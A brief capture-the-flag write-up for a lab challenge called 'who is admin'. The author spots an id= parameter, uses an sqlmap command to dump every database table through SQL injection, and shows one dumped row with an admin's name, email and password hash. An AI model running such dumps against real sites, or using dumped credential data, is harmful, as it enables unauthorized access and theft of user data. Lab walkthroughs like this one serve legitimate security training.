Medium Challenges

Challenge Name: who is admin


I found the landing page 
In each page there is an id= parameter

![image](../media/image18.png)



![image](../media/image19.png)

I used sqlmap -u “lab-url” –dump to dump all tables as I identified that its sqli vulnerable 


![image](../media/image20.png)

15 | Ryan      | admin | ryan@secret.org      | 03c5333447698a7eadb6a99fa3c72916ec7fc28a
I got the admin ryan@secret.org 

---------------------------------------------------------------------------------------------------------------